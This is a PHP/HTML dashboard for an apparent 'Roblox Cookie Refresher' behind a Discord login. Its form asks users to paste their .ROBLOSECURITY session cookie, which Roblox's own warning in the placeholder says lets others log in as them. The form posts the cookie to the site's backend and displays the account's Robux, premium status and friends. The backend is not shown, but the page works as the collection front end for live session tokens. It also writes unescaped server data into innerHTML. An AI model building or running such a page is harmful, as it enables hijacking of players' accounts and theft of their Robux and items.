<?php
/**
 * Dashboard - Cookie Refresher Interface
 * 
 * Main application interface for authenticated users.
 * Allows cookie refresh and displays account information.
 * 
 * @package RobloxRefresher
 * @author  Your Name
 * @version 1.0.0
 */

// Configure session persistence
ini_set('session.gc_maxlifetime', 2592000);
session_set_cookie_params(2592000);
session_start();

// Require authentication
if (!isset($_SESSION['discord_user'])) {
    header('Location: login.php');
    exit;
}

$user = $_SESSION['discord_user'];

// Build avatar URL
$avatarUrl = $user['avatar'] 
    ? sprintf('https://cdn.discordapp.com/avatars/%s/%s.png?size=128', $user['id'], $user['avatar'])
    : 'https://cdn.discordapp.com/embed/avatars/0.png';

$username = htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Roblox cookie refresher dashboard">
    <title>Dashboard - Roblox Cookie Refresher</title>
    <style>
        /* CSS Variables */
        :root {
            --bg-primary: #070A12;
            --bg-secondary: #050712;
            --text-primary: rgba(255, 255, 255, 0.92);
            --text-secondary: rgba(255, 255, 255, 0.62);
            --accent-blue: #7CB6FF;
            --accent-blue-light: #A8CEFF;
            --card-bg: rgba(255, 255, 255, 0.06);
            --card-border: rgba(140, 190, 255, 0.14);
            --success: #29c27f;
            --error: #f05555;
        }

        /* Reset & Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            min-height: 100%;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: var(--text-primary);
            background: 
                radial-gradient(900px 520px at 50% 26%, rgba(124, 182, 255, 0.1), transparent 60%),
                radial-gradient(700px 420px at 50% 42%, rgba(124, 182, 255, 0.06), transparent 58%),
                linear-gradient(180deg, var(--bg-primary), var(--bg-secondary));
            padding: 20px 16px 40px;
        }

        /* Container */
        .container {
            max-width: 900px;
            margin: 0 auto;
        }

        /* Navigation Bar */
        .navbar {
            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
            border: 1px solid var(--card-border);
            border-radius: 18px;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
            margin-bottom: 32px;
        }

        .nav-left {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .user-avatar {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            border: 2px solid var(--card-border);
        }

        .user-info {
            display: flex;
            flex-direction: column;
        }

        .user-name {
            font-weight: 600;
            font-size: 15px;
            color: var(--text-primary);
        }

        .user-status {
            font-size: 13px;
            color: var(--text-secondary);
        }

        .logout-btn {
            background: rgba(240, 85, 85, 0.1);
            color: var(--error);
            border: 1px solid rgba(240, 85, 85, 0.2);
            padding: 10px 20px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-block;
        }

        .logout-btn:hover {
            background: rgba(240, 85, 85, 0.15);
            border-color: rgba(240, 85, 85, 0.3);
        }

        /* Main Card */
        .main-card {
            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
            border: 1px solid var(--card-border);
            border-radius: 20px;
            padding: 36px;
            box-shadow: 0 26px 80px rgba(0, 0, 0, 0.62);
            margin-bottom: 24px;
        }

        .card-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .card-title {
            font-size: 28px;
            font-weight: 600;
            letter-spacing: -0.02em;
            margin-bottom: 8px;
            background: linear-gradient(135deg, var(--accent-blue), var(--accent-blue-light));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .card-subtitle {
            color: var(--text-secondary);
            font-size: 15px;
        }

        /* Input Group */
        .input-group {
            margin-bottom: 24px;
        }

        .input-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: var(--text-secondary);
            margin-bottom: 10px;
        }

        .input-field {
            width: 100%;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--card-border);
            border-radius: 12px;
            padding: 14px 16px;
            color: var(--text-primary);
            font-size: 14px;
            font-family: 'Courier New', monospace;
            transition: all 0.2s;
            resize: vertical;
            min-height: 120px;
        }

        .input-field:focus {
            outline: none;
            border-color: var(--accent-blue);
            background: rgba(255, 255, 255, 0.06);
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        /* Button */
        .refresh-btn {
            width: 100%;
            background: linear-gradient(135deg, var(--accent-blue), #5A9EE8);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 8px 24px rgba(124, 182, 255, 0.3);
        }

        .refresh-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 32px rgba(124, 182, 255, 0.4);
        }

        .refresh-btn:active {
            transform: translateY(0);
        }

        .refresh-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* Result Card */
        .result-card {
            display: none;
            background: linear-gradient(180deg, var(--card-bg), rgba(255, 255, 255, 0.045));
            border: 1px solid var(--card-border);
            border-radius: 16px;
            padding: 24px;
            margin-top: 24px;
        }

        .result-card.show {
            display: block;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .result-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 16px;
        }

        .result-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
        }

        .result-icon.success {
            background: rgba(41, 194, 127, 0.2);
            color: var(--success);
        }

        .result-icon.error {
            background: rgba(240, 85, 85, 0.2);
            color: var(--error);
        }

        .result-title {
            font-weight: 600;
            font-size: 16px;
        }

        .result-content {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 10px;
            padding: 16px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            word-break: break-all;
            color: var(--text-secondary);
            margin-bottom: 12px;
            max-height: 200px;
            overflow-y: auto;
        }

        .copy-btn {
            background: rgba(124, 182, 255, 0.1);
            color: var(--accent-blue);
            border: 1px solid rgba(124, 182, 255, 0.2);
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            width: 100%;
        }

        .copy-btn:hover {
            background: rgba(124, 182, 255, 0.15);
            border-color: rgba(124, 182, 255, 0.3);
        }

        /* User Data Grid */
        .user-data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
            margin-top: 16px;
        }

        .data-item {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 10px;
            padding: 12px;
        }

        .data-label {
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 4px;
        }

        .data-value {
            font-size: 14px;
            font-weight: 600;
            color: var(--text-primary);
        }

        /* ================================================
           LOADING OVERLAY - Blurred Background
           ================================================ */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(7, 10, 18, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .loading-overlay.active {
            display: flex;
            opacity: 1;
        }

        .spinner {
            width: 64px;
            height: 64px;
            border: 4px solid rgba(124, 182, 255, 0.15);
            border-top-color: var(--accent-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 24px;
            color: var(--text-secondary);
            font-size: 14px;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .navbar {
                flex-direction: column;
                gap: 16px;
                text-align: center;
            }

            .main-card {
                padding: 24px;
            }

            .card-title {
                font-size: 24px;
            }

            .user-data-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.02);
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(124, 182, 255, 0.3);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(124, 182, 255, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Navigation -->
        <nav class="navbar">
            <div class="nav-left">
                <img src="<?php echo $avatarUrl; ?>" alt="Avatar" class="user-avatar">
                <div class="user-info">
                    <div class="user-name"><?php echo $username; ?></div>
                    <div class="user-status">Logged in with Discord</div>
                </div>
            </div>
            <a href="logout.php" class="logout-btn">Logout</a>
        </nav>

        <!-- Main Card -->
        <div class="main-card">
            <div class="card-header">
                <h1 class="card-title">Cookie Refresher</h1>
                <p class="card-subtitle">Enter your Roblox cookie to refresh it</p>
            </div>

            <form id="refreshForm" onsubmit="refreshCookie(event)">
                <div class="input-group">
                    <label for="cookieInput" class="input-label">Roblox Cookie (.ROBLOSECURITY)</label>
                    <textarea 
                        id="cookieInput" 
                        class="input-field" 
                        placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."
                        required
                    ></textarea>
                </div>

                <button type="submit" class="refresh-btn" id="refreshBtn">
                    Refresh Cookie
                </button>
            </form>

            <!-- Success Result -->
            <div class="result-card" id="successResult">
                <div class="result-header">
                    <div class="result-icon success">✓</div>
                    <div class="result-title">Cookie Refreshed Successfully!</div>
                </div>
                <div class="result-content" id="newCookie"></div>
                <button class="copy-btn" onclick="copyCookie()">Copy to Clipboard</button>
                
                <!-- User Data -->
                <div class="user-data-grid" id="userData"></div>
            </div>

            <!-- Error Result -->
            <div class="result-card" id="errorResult">
                <div class="result-header">
                    <div class="result-icon error">✕</div>
                    <div class="result-title">Error</div>
                </div>
                <div class="result-content" id="errorMessage"></div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            © 2026 Roblox Cookie Refresher. Made with ❤️
        </div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <script>
        let refreshedCookie = '';

        function showLoading() {
            document.getElementById('loadingOverlay').classList.add('active');
        }

        function hideLoading() {
            document.getElementById('loadingOverlay').classList.remove('active');
        }

        function showSuccess(data) {
            document.getElementById('errorResult').classList.remove('show');
            document.getElementById('successResult').classList.add('show');
            document.getElementById('newCookie').textContent = data.cookie;
            refreshedCookie = data.cookie;

            // Display user data if available
            if (data.userData) {
                const userData = data.userData;
                const userDataHtml = `
                    <div class="data-item">
                        <div class="data-label">Username</div>
                        <div class="data-value">${userData.username || '—'}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">User ID</div>
                        <div class="data-value">${userData.userId || '—'}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">Robux</div>
                        <div class="data-value">${userData.robux || '0'}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">Premium</div>
                        <div class="data-value">${userData.premium || '—'}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">Account Age</div>
                        <div class="data-value">${userData.accountAge || '—'}</div>
                    </div>
                    <div class="data-item">
                        <div class="data-label">Friends</div>
                        <div class="data-value">${userData.friends || '0'}</div>
                    </div>
                `;
                document.getElementById('userData').innerHTML = userDataHtml;
            }
        }

        function showError(message) {
            document.getElementById('successResult').classList.remove('show');
            document.getElementById('errorResult').classList.add('show');
            document.getElementById('errorMessage').textContent = message;
        }

        async function refreshCookie(event) {
            event.preventDefault();

            const cookieInput = document.getElementById('cookieInput').value.trim();
            const refreshBtn = document.getElementById('refreshBtn');

            if (!cookieInput) {
                showError('Please enter a cookie');
                return;
            }

            // Disable button and show loading
            refreshBtn.disabled = true;
            refreshBtn.textContent = 'Processing...';
            showLoading();

            try {
                const response = await fetch('/api/refresh.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `cookie=${encodeURIComponent(cookieInput)}`
                });

                const data = await response.json();

                hideLoading();

                if (data.error) {
                    showError(data.error);
                } else {
                    showSuccess(data);
                }
            } catch (error) {
                hideLoading();
                showError('Network error. Please try again.');
                console.error('Error:', error);
            } finally {
                refreshBtn.disabled = false;
                refreshBtn.textContent = 'Refresh Cookie';
            }
        }

        function copyCookie() {
            if (!refreshedCookie) return;

            navigator.clipboard.writeText(refreshedCookie).then(() => {
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = 'Copied!';
                btn.style.background = 'rgba(41, 194, 127, 0.2)';
                btn.style.color = 'var(--success)';
                btn.style.borderColor = 'rgba(41, 194, 127, 0.3)';

                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.background = 'rgba(124, 182, 255, 0.1)';
                    btn.style.color = 'var(--accent-blue)';
                    btn.style.borderColor = 'rgba(124, 182, 255, 0.2)';
                }, 2000);
            }).catch(err => {
                showError('Failed to copy to clipboard');
                console.error('Copy failed:', err);
            });
        }
    </script>
</body>
</html>
